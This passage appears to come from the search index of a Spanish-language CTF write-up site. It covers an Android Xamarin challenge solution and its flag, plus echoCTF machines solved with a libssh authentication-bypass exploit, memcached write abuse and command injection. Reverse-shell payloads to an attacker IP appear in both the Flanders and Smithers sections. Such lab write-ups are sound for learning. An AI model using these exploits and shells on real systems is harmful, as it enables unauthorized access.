wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#notas-adicionales","title":"Notas adicionales","text":"<p>Al comparar mi resoluci\u00f3n me di cuenta que para visualizar la columna protegida del archivo en excel <code>Phishing_Attempt.xlsx</code>, es posible eliminar la protecci\u00f3n, borrando la etiqueta <code>&lt;sheetProtection&gt;</code> de <code>xl/worksheets/sheet2.xml</code> y creando de nuevo un zip desde la ra\u00edz, de esta manera ser\u00eda posible visualizar tambi\u00e9n las columnas directamente en la hoja de c\u00e1lculo.</p> <pre><code>\u2514\u2500$ zip phishing.xls -r .\n  adding: docProps/ (stored 0%)\n  adding: docProps/app.xml (deflated 52%)\n  adding: docProps/core.xml (deflated 47%)\n  adding: _rels/ (stored 0%)\n  adding: _rels/.rels (deflated 60%)\n  adding: [Content_Types].xml (deflated 79%)\n  adding: xl/ (stored 0%)\n# Data truncada\n</code></pre> <p></p>","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#referencias","title":"Referencias","text":"<ul> <li>Certificados PFX/P12/PKCS#12.</li> <li>Robo de certificados.</li> <li>SharpHound.</li> <li>BloodHound.</li> <li>Permiso ReadGMSAPassword.</li> </ul>","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Challenges/Mobile/Medium/SeeTheSharpFlag/","title":"SeeTheSharpFlag","text":"","tags":["Android","Xamarin","APKTool","Compresi\u00f3n XALZ","Decompilaci\u00f3n de DLLs","ILSpy"]},{"location":"HackTheBox/Challenges/Mobile/Medium/SeeTheSharpFlag/#informacion","title":"Informaci\u00f3n","text":"Caracter\u00edstica Descripci\u00f3n Dificultad oficial Medium Puntos 40 Creadores heartpoll &amp; bertolis Descripci\u00f3n I have made a password verification app. If I can remember the password, the app will tell me it is correct. See if you can guess my password.","tags":["Android","Xamarin","APKTool","Compresi\u00f3n XALZ","Decompilaci\u00f3n de DLLs","ILSpy"]},{"location":"HackTheBox/Challenges/Mobile/Medium/SeeTheSharpFlag/#reconocimiento-inicial","title":"Reconocimiento inicial","text":"<p>Nos entregan el archivo <code>com.companyname.seethesharpflag-x86.apk</code> y haciendo uso de <code>jadx-gui</code> directamente sobre el apk se visualiza la estructura del c\u00f3digo, sin embargo, se pueden observar ciertos \"wrappers\" y c\u00f3digo de varias bibliotecas utilizadas, entre lo identificado una relacionada a xamarin, tecnolog\u00eda que se ocupa para desarrollar aplicaciones multiplataforma con C#/.NET.</p> <p></p> <p>Adicionalmente se uso <code>apktool</code> para ver si se obten\u00eda m\u00e1s informaci\u00f3n de utilidad.</p> <p></p> <p>Despu\u00e9s, se listo el directorio creado en la ejecuci\u00f3n, encontrando as\u00ed DLLs potenciales para analizar.</p> <p></p>","tags":["Android","Xamarin","APKTool","Compresi\u00f3n XALZ","Decompilaci\u00f3n de DLLs","ILSpy"]},{"location":"HackTheBox/Challenges/Mobile/Medium/SeeTheSharpFlag/#intento-de-decompilacion","title":"Intento de decompilaci\u00f3n","text":"<p>Haciendo uso de VSCode m\u00e1s el plugin de ILSpy se pueden seleccionar las DLLs deseadas e intentar decompilarlas para visualizar el c\u00f3digo fuente.</p> <p></p> <p>Curiosamente, al seleccionar cualquiera de las DLLs para decompilar, sobresale un error al intentar cargar la DLL.</p> <p></p> <p>M\u00e1s a\u00fan, si intentamos identificar el tipo de archivo de las DLLs extra\u00eddas, son identificadas como \"Sony PlayStation Audio\".</p> <p></p>","tags":["Android","Xamarin","APKTool","Compresi\u00f3n XALZ","Decompilaci\u00f3n de DLLs","ILSpy"]},{"location":"HackTheBox/Challenges/Mobile/Medium/SeeTheSharpFlag/#decompresion-de-xalz","title":"Decompresi\u00f3n de XALZ","text":"<p>Despu\u00e9s de indagar m\u00e1s al respecto, se encontr\u00f3 este art\u00edculo en el cual describen un tipo de compresi\u00f3n que no fue del todo \"notificado\" o no es del todo \"conocido\" llamado XALZ, gestionado por el equipo de desarrollo de Xamarin (escribo un poco m\u00e1s a detalle aqu\u00ed). El art\u00edculo expone el siguiente script para descomprimir el archivo y obtener la DLL original.</p> Xamarin_XALZ_decompress.py<pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\"\"\"\nInstallation notes:\nThis program requires the python lz4 library.\nInstall via \n* \"lz4\" (pip) \n* \"python3-lz4\" (Debian, Ubuntu)\n\"\"\"\n\nimport lz4.block\nimport sys\nimport struct\n\ndef print_usage_and_exit(): \n    sys.exit(\"usage: ./command compressed-inputfile.dll uncompressed-outputfile.dll\")\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 3:\n        print_usage_and_exit()\n\n    input_filepath = sys.argv[1]\n    output_filepath = sys.argv[2]\n    header_expected_magic = b'XALZ'\n\n    with open(input_filepath, \"rb\") as xalz_file:\n        data = xalz_file.read()\n\n        if data[:4] != header_expected_magic:\n            sys.exit(\"The input file does not contain the expected magic bytes, aborting ...\")\n\n        header_index = data[4:8]\n        header_uncompressed_length = struct.unpack('&lt;I', data[8:12])[0]\n        payload = data[12:]\n\n        print(\"header index: %s\" % header_index)\n        print(\"compressed payload size: %s bytes\" % len(payload))\n        print(\"uncompressed length according to header: %s bytes\" % header_uncompressed_length)\n\n        decompressed = lz4.block.decompress(payload, uncompressed_size=header_uncompressed_length)\n\n        with open(output_filepath, \"wb\") as output_file:\n            output_file.write(decompressed)\n            output_file.close()\n        print(\"result written to file\")\n</code></pre> <p>Por lo que se ejecuta el script se\u00f1alando la DLL y se indica el nombre de la DLL posterior a la decompresi\u00f3n de la siguiente manera.</p> <p></p> <p>Como resultado, si de nuevo se ejecuta el comando <code>file</code> a las DLLs extra\u00eddas ahora el archivo es identificado como DLL.</p> <p></p>","tags":["Android","Xamarin","APKTool","Compresi\u00f3n XALZ","Decompilaci\u00f3n de DLLs","ILSpy"]},{"location":"HackTheBox/Challenges/Mobile/Medium/SeeTheSharpFlag/#decompilado-de-dlls","title":"Decompilado de DLLs","text":"<p>Ahora si se puede hacer uso de <code>ILSpy</code> como anteriomente se se\u00f1al\u00f3, pudiendo ver as\u00ed el c\u00f3digo fuente resultante de la decompilaci\u00f3n.</p> <p></p> <p>Dentro de la DLL <code>SeeTheSharpFlag.dll</code> se identific\u00f3 la clase <code>MainPage</code> la cual, resalto la funci\u00f3n <code>Button_Clicked</code>. Esta, realiza un proceso de descifrado AES de un valor y se pueden ver los valores de lo cifrado, el IV y llave.</p> <pre><code>private void Button_Clicked(object sender, EventArgs e)\n{\n    byte[] buffer = Convert.FromBase64String(\"sjAbajc4sWMUn6CHJBSfQ39p2fNg2trMVQ/MmTB5mno=\");\n    byte[] rgbKey = Convert.FromBase64String(\"6F+WgzEp5QXodJV+iTli4Q==\");\n    byte[] rgbIV = Convert.FromBase64String(\"DZ6YdaWJlZav26VmEEQ31A==\");\n    using AesManaged aesManaged = new AesManaged();\n    using ICryptoTransform transform = aesManaged.CreateDecryptor(rgbKey, rgbIV);\n    using MemoryStream stream = new MemoryStream(buffer);\n    using CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);\n    using StreamReader streamReader = new StreamReader(stream2);\n    if (streamReader.ReadToEnd() == ((InputView)SecretInput).Text)\n    {\n        SecretOutput.Text = \"Congratz! You found the secret message\";\n    }\n    else\n    {\n        SecretOutput.Text = \"Sorry. Not correct password\";\n    }\n}\n</code></pre> <p>Con esta informaci\u00f3n se puede realizar el descifrado, sintentizado en la receta de CyberChef:</p> <pre><code>https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'Base64','string':'6F%2BWgzEp5QXodJV%2BiTli4Q%3D%3D'%7D,%7B'option':'Base64','string':'DZ6YdaWJlZav26VmEEQ31A%3D%3D'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&amp;input=c2pBYmFqYzRzV01VbjZDSEpCU2ZRMzlwMmZOZzJ0ck1WUS9NbVRCNW1ubz0\n</code></pre> <p>Obteniendo as\u00ed la bandera del reto.</p> <p></p> <p>Bandera: HTB{MyPasswordIsVerySecure}.</p>","tags":["Android","Xamarin","APKTool","Compresi\u00f3n XALZ","Decompilaci\u00f3n de DLLs","ILSpy"]},{"location":"HackTheBox/Challenges/Mobile/Medium/SeeTheSharpFlag/#referencias","title":"Referencias","text":"<ul> <li>Microsoft - Xamarin.</li> <li>Secronomicon - Gu\u00edas Mobile General.</li> <li>X41 D-Sec - Decompressing Xamarin DLLs.</li> <li>Github Pull Request - Add support for compressed assemblies in APK.</li> </ul>","tags":["Android","Xamarin","APKTool","Compresi\u00f3n XALZ","Decompilaci\u00f3n de DLLs","ILSpy"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/","title":"Flanders","text":"<p>Write-up de la m\u00e1quina Flanders de echoCTF.</p> <p></p>","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#indice","title":"\u00cdndice","text":"<ul> <li>Introducci\u00f3n</li> <li>Estad\u00edsticas</li> <li>Reconocimiento</li> <li>Escaneo de host<ul> <li>Escaneo completo de puertos</li> <li>Escaneo espec\u00edfico</li> </ul> </li> <li>Enumeraci\u00f3n</li> <li>Servicios (nombre - puerto)<ul> <li>ssh - 6022</li> <li>Manual</li> </ul> </li> <li>Explotaci\u00f3n</li> <li>libSSH Authentication Bypass<ul> <li>Pasos previos | Preparaci\u00f3n</li> <li>Ejecuci\u00f3n</li> </ul> </li> <li>Post Explotaci\u00f3n</li> <li>Enumeraci\u00f3n</li> <li>Escalaci\u00f3n de privilegios<ul> <li>ETSCTF \u2192 root</li> </ul> </li> <li>Ubicaci\u00f3n de banderas</li> </ul>","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#introduccion","title":"Introducci\u00f3n","text":"","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#estadisticas","title":"Estad\u00edsticas","text":"Caracter\u00edstica Descripci\u00f3n Nombre Flanders Dificultad Basic Banderas 4 (2 system, env, root) Puntos 4,800 pts (system/1,000 pts, system/1,300 pts, env/900 pts, root/1,500 pts) Descripci\u00f3n / Pistas Flanders simple and kind, always ready to to give a helping hand. His favorite catch phrase is <code>Okily Dokily</code>. Catch phrase sounds like a pass phrase, only without space","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#reconocimiento","title":"Reconocimiento","text":"","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#escaneo-de-host","title":"Escaneo de host","text":"","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#escaneo-completo-de-puertos","title":"Escaneo completo de puertos","text":"<pre><code>\u276f sudo nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-10-27 09:35 CDT\nInitiating SYN Stealth Scan at 09:35\nScanning 10.0.100.34 [65535 ports]\nDiscovered open port 6022/tcp on 10.0.100.34\nCompleted SYN Stealth Scan at 09:35, 14.77s elapsed (65535 total ports)\nNmap scan report for 10.0.100.34\nHost is up, received user-set (0.14s latency).\nScanned at 2021-10-27 09:35:04 CDT for 15s\nNot shown: 65534 closed ports\nReason: 65534 resets\nPORT     STATE SERVICE REASON\n6022/tcp open  x11     syn-ack ttl 63\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 15.11 seconds\n           Raw packets sent: 72729 (3.200MB) | Rcvd: 70809 (2.832MB)\n</code></pre>","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#escaneo-especifico","title":"Escaneo espec\u00edfico","text":"<pre><code>\u276f nmap -sCV -p 6022 -oN nmap/targeted $BOX_TARGET\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-10-27 09:48 CDT\nNmap scan report for 10.0.100.34\nHost is up (0.14s latency).\n\nPORT     STATE SERVICE VERSION\n6022/tcp open  ssh     libssh 0.8.1 (protocol 2.0)\n| ssh-hostkey:\n|_  2048 9c:42:2e:fa:60:30:95:dd:a0:60:80:1f:fd:ae:77:86 (RSA)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 4.85 seconds\n</code></pre>","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#enumeracion","title":"Enumeraci\u00f3n","text":"","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#servicios-nombre-puerto","title":"Servicios (nombre - puerto)","text":"","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#ssh-6022","title":"ssh - 6022","text":"","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#manual","title":"Manual","text":"<p>Dado el reconocimiento por medio de <code>nmap</code> se puede identificar que se est\u00e1 corriendo un servidor <code>ssh</code> en un puerto no convencional y se expone la versi\u00f3n <code>libssh 0.8.1</code>, despu\u00e9s de una b\u00fasqueda se puede identificar que la versi\u00f3n expuesta cuenta con una vulnerabilidad la cu\u00e1l explota un bypass de autenticaci\u00f3n, reportada en el CVE-2018-10933.</p> <p>Se encontraron diversos scripts en python que abusan de la vulnerabilidad:</p> <ul> <li>https://www.exploit-db.com/exploits/45638</li> <li>https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d</li> </ul>","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#explotacion","title":"Explotaci\u00f3n","text":"","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#libssh-authentication-bypass","title":"libSSH Authentication Bypass","text":"","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#pasos-previos-preparacion","title":"Pasos previos | Preparaci\u00f3n","text":"<p>Como parte de los scripts buscados se encontr\u00f3 el siguiente c\u00f3digo en un script que result\u00f3 bastante simple de ejecutar, \u00fanicamente realizando los cambios pertinentes de ip, puerto y comando (entablando una reverse shell).</p> <p>Script <pre><code>#!/usr/bin/python3\n\nimport sys\nimport paramiko\nimport socket\n\ns=socket.socket()\ns.connect((\"10.0.100.34\",6022))\nm=paramiko.message.Message()\nt=paramiko.transport.Transport(s)\nt.start_client()\nm.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)\nt._send_message(m)\nc=t.open_session(timeout=5)\nc.exec_command(\"nc -e /bin/bash 10.10.0.26 1234\")\nout=c.makefile(\"rb\",2048)\noutput=out.read()\nout.close()\nprint (output)\n</code></pre></p>","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#ejecucion","title":"Ejecuci\u00f3n","text":"<ol> <li>Ejecuci\u00f3n de script.</li> <li>Listener de reverse shell.</li> </ol>","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#post-explotacion","title":"Post Explotaci\u00f3n","text":"","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#enumeracion_1","title":"Enumeraci\u00f3n","text":"<p>Realizando enumeraci\u00f3n manual se puede observar que el directorio principal del usuario al que se accede <code>ETSCTF</code> contiene una llave <code>ssh</code> que a primera impresi\u00f3n apuntar\u00eda a un m\u00e9todo de escalaci\u00f3n de privilegios a <code>root</code>.</p> <p></p> <ol> <li>Directorio.</li> <li>Llave.</li> <li>Usuario al que pertenece.</li> </ol>","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#escalacion-de-privilegios","title":"Escalaci\u00f3n de privilegios","text":"","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#etsctf-root","title":"ETSCTF \u2192 root","text":"<p>La idea inicial a seguir ser\u00eda extraer la llave encontrada para intentar acceder al sistema con ella, dado que ning\u00fan intento funcion\u00f3, se puede tratar de ubicar si existe alg\u00fan otro medio de acceso a la m\u00e1quina por el cu\u00e1l est\u00e9 restringida a conexiones provenientes \u00fanicamente desde local, es decir, de <code>flanders</code> hacia <code>flanders</code>. Para comprobar esto se puede buscar si alg\u00fan servicio de <code>ssh</code> est\u00e1 ejecutandose y si existe alg\u00fan puerto que est\u00e9 a la escucha de nuevas conexiones.</p> <p></p> <p>La salida del comando mapea autom\u00e1ticamente los puertos com\u00fanes para el servicio siendo as\u00ed que <code>127.0.0.1:ssh</code> ser\u00eda lo mismo que <code>127.0.0.1:22</code>, verificando de esta manera que se escuchan conexiones <code>ssh</code> localmente.</p> <p></p> <p>En esta comprobaci\u00f3n se puede ver que se est\u00e1 ejecutando <code>sshd</code> correspondiente al servidor de <code>ssh</code> en linux.</p> <p>Se suelen proteger las llaves <code>ssh</code> con passphrases y observando que en la descripci\u00f3n de la m\u00e1quina se proporciona una passphrase (<code>Okily Dokily</code>) se pudiera concluir que al hacer uso de la llave se pedir\u00e1.</p> <p></p> <p>Logrando as\u00ed satisfactoriamente la escalaci\u00f3n de privilegios.</p> <p></p>","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Flanders/#ubicacion-de-banderas","title":"Ubicaci\u00f3n de banderas","text":"<ol> <li><code>/etc/passwd</code>.</li> <li><code>/etc/shadow</code>.</li> <li>Extrayendo las variables de entorno de los procesos en ejecuci\u00f3n con <code>strings /proc/*/environ | grep ETSCTF</code>.</li> <li><code>/root</code>.</li> </ol>","tags":["SSH Authentication Bypass (libssh)"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/","title":"Smithers","text":"<p>Write-up de la m\u00e1quina Smithers de echoCTF.</p> <p></p>","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#indice","title":"\u00cdndice","text":"<ul> <li>Introducci\u00f3n</li> <li>Estad\u00edsticas</li> <li>Reconocimiento</li> <li>Escaneo de host<ul> <li>Escaneo completo de puertos</li> <li>Escaneo espec\u00edfico</li> </ul> </li> <li>Enumeraci\u00f3n</li> <li>Servicios<ul> <li>http - 10888</li> <li>Manual</li> <li>memcached - 11211</li> <li>Manual</li> </ul> </li> <li>Explotaci\u00f3n</li> <li>Abuso de escritura de items en <code>memcached</code><ul> <li>Pasos previos | Preparaci\u00f3n</li> <li>M\u00e9todo 1</li> <li>M\u00e9todo 2</li> <li>Ejecuci\u00f3n</li> </ul> </li> <li>Ubicaci\u00f3n de banderas</li> </ul>","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#introduccion","title":"Introducci\u00f3n","text":"","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#estadisticas","title":"Estad\u00edsticas","text":"Caracter\u00edstica Descripci\u00f3n Nombre Smithers Dificultad Basic Banderas 7 (5 other, env, root) Puntos 8,100 pts (other/1,500 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, env/900 pts, root/1,500 pts) Descripci\u00f3n / Pistas Like Smithers this server will serve you well only if you manage to enter it's memcached store. The memcache service you just discovered on smithers.echocity-f.com/10.0.160.142:11211 has a hidden flag.","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#reconocimiento","title":"Reconocimiento","text":"","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#escaneo-de-host","title":"Escaneo de host","text":"","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#escaneo-completo-de-puertos","title":"Escaneo completo de puertos","text":"<pre><code>\u276f nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 19:45 CDT\nInitiating Connect Scan at 19:45\nScanning 10.0.100.142 [65535 ports]\nDiscovered open port 11211/tcp on 10.0.100.142\nDiscovered open port 10888/tcp on 10.0.100.142\nCompleted Connect Scan at 19:45, 21.90s elapsed (65535 total ports)\nNmap scan report for 10.0.100.142\nHost is up, received user-set (0.14s latency).\nScanned at 2021-10-14 19:45:20 CDT for 22s\nNot shown: 53830 closed ports, 11703 filtered ports\nReason: 53830 conn-refused and 11703 no-responses\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE  REASON\n10888/tcp open  unknown  syn-ack\n11211/tcp open  memcache syn-ack\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 22.00 seconds\n</code></pre>","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#escaneo-especifico","title":"Escaneo espec\u00edfico","text":"<pre><code>\u276f nmap -sCV -p 11211,10888 -oN nmap/targeted $BOX_TARGET\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 19:46 CDT\nNmap scan report for 10.0.100.142\nHost is up (0.14s latency).\n\nPORT      STATE SERVICE   VERSION\n10888/tcp open  http      nginx\n|_http-title: Network Tools\n11211/tcp open  memcached Memcached 1.5.12 (uptime 36084 seconds)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.60 seconds\n</code></pre>","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#enumeracion","title":"Enumeraci\u00f3n","text":"","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#servicios","title":"Servicios","text":"","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#http-10888","title":"http - 10888","text":"","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#manual","title":"Manual","text":"<p>Al navegar al sitio se visualiza alg\u00fan tipo de servicio que pone a disposici\u00f3n utilidades de red, pero de acuerdo con el mensaje que se arroja se puede suponer que para tener acceso se requiere estar en alg\u00fan tipo de lista blanca que se encuentra configurada en el servidor. Tratando de hacer un bypass b\u00e1sico a esta validaci\u00f3n se decidi\u00f3 jugar un poco con cabeceras como X-Forwarded-For entre otras, para ver si la respuesta por parte del servidor cambiaba de alg\u00fan modo, sin \u00e9xito aparente.</p> <p></p>","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#memcached-11211","title":"memcached - 11211","text":"","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#manual_1","title":"Manual","text":"<p>Siendo permitida la conexi\u00f3n directa mal socket mediante <code>netcat</code> se permite la obtenci\u00f3n de datos existentes en el servidor mediante comandos propios de <code>memcached</code>, datos como versi\u00f3n, estatus, slabs, items, entre otros.</p> <p>Comandos \u00fatiles</p> <p>Despu\u00e9s de entablar la conexi\u00f3n</p> <pre><code>version # Obtener versi\u00f3n\nstats # Obtener estatus\nstats slabs # Obtener slabs\nstats items # Obtener items de slabs con informaci\u00f3n\nstats cachedump &lt;numero_de_item&gt; 0 # Obtener nombres de llaves (0 es para no limitar el tama\u00f1o del output)\nget &lt;nombre_de_item&gt; # Obtener informaci\u00f3n guardada de item\n</code></pre> <p>Referencia: https://book.hacktricks.xyz/pentesting/11211-memcache</p> <p></p> <p>Recalcando que para la obtenci\u00f3n del <code>n\u00famero de item</code> se puede extraer de la columna se\u00f1alada del output generado por la obtenci\u00f3n de los items.</p>","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#explotacion","title":"Explotaci\u00f3n","text":"<p>Habiendo encontrado que se puede exfiltrar informaci\u00f3n mediante la interacci\u00f3n con el servicio de <code>memcached</code> faltar\u00eda validar si tambi\u00e9n se puede configurar informaci\u00f3n en el servicio.</p>","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#abuso-de-escritura-de-items-en-memcached","title":"Abuso de escritura de items en <code>memcached</code>","text":"","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#pasos-previos-preparacion","title":"Pasos previos | Preparaci\u00f3n","text":"<p>Dentro de la enumeraci\u00f3n se encontr\u00f3 que la versi\u00f3n de <code>memcached</code> y la informaci\u00f3n contenida al navegar al sitio expuesto coincid\u00eda por lo que bajo la suposici\u00f3n de que estos dos interactuan entre s\u00ed y de no haber encontrado el item <code>REMOTE_ADDR</code> como lo indica el sitio web se puede intentar guardando este item con el valor de la IP correspondiente.</p> <p>Sintaxis</p> <pre><code>set key flags exptime bytes\nvalue \n</code></pre> <p>Uso</p> <pre><code>set REMOTE_ADDR 0 2592000 4\ntest\n</code></pre> <p>Referencia: https://www.tutorialspoint.com/memcached/memcached_set_data.htm</p> <p>Al tener problemas de interacci\u00f3n directa para configurar los valores se encontraron otras alternativas funcionales.</p>","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#metodo-1","title":"M\u00e9todo 1","text":"<p>Comando</p> <p><code>echo -e 'set REMOTE_ADDR 0 2592000 4\\r\\ntest\\r' | nc -nv -w 1 10.0.100.142 11211</code></p> <p></p> <ol> <li>Ejecuci\u00f3n.</li> <li>Validaci\u00f3n de existencia (cuando antes no se desplegaba el item 1).</li> <li>Obtenci\u00f3n de valor de valor.</li> </ol>","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#metodo-2","title":"M\u00e9todo 2","text":"<p>El paquete <code>libmemcached-tools</code> cuenta con utilidades para interactuar con conexiones de <code>memcached</code>. Haciendo uso de <code>memccp</code> se puede copiar un valor pasando como par\u00e1metro el archivo con el valor que se piensa ocupar y haciendo uso de <code>memcat</code> para la visualizaci\u00f3n de los valores de los items.</p> <pre><code>sudo apt install libmemcached-tools\necho -n \"test2\" &gt; REMOTE_ADDR\nmemccp --servers=10.0.100.142 REMOTE_ADDR\nmemccat --servers=10.0.100.142 REMOTE_ADDR\n</code></pre> <p></p> <p>Referencia: https://www.hackingarticles.in/penetration-testing-on-memcached-server/</p>","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#ejecucion","title":"Ejecuci\u00f3n","text":"<p>Configurando la variable que concuerda con ambos servicios y a\u00f1adiendo la asignada por la vpn el output de la p\u00e1gina resulta diferente.</p> <p></p> <p>A partir de este punto se puede observar que se habilita un formulario para realizar un ping a un host, lo que a nivel de c\u00f3digo se puede reducir en algo como:</p> <pre><code>$ip = \"valor proporcionado por formulario\"\nsystem('ping ' . $ip);\n</code></pre> <p>Lo que al final se reducir\u00eda en ejecuci\u00f3n remota de comandos, ya que en consola podemos usar \"separadores\" para ejecutar m\u00faltiples comandos en una misma instrucci\u00f3n, lo que a nivel de c\u00f3digo se ejemplificar\u00eda en <code>ping 127.0.0.1; whoami</code>.</p> <p></p> <p>Al ver el servicio lo ejecuta directamente <code>root</code>, al obtener una reverse shell, no se requirir\u00eda proceso de escalaci\u00f3n de privilegios.</p> <p>Al realizar la prueba para obtener una reverse shell con netcat usando <code>;nc -e /bin/bash 10.10.0.26 1234</code> no se ejecut\u00f3 satisfactoriamente por lo que se opt\u00f3 intentar con diferentes opciones, siendo <code>python3</code> el funcional:</p> <pre><code>;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.0.26\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'\n</code></pre> <p></p>","tags":["Abusing memcache write item permission","Command Injection"]},{"location":"echoCTF/Boxes/2%20B%C3%A1sico/Smithers/#ubicacion-de-banderas","title":"Ubicaci\u00f3n de banderas","text":"<ol> <li>Llave - valor de 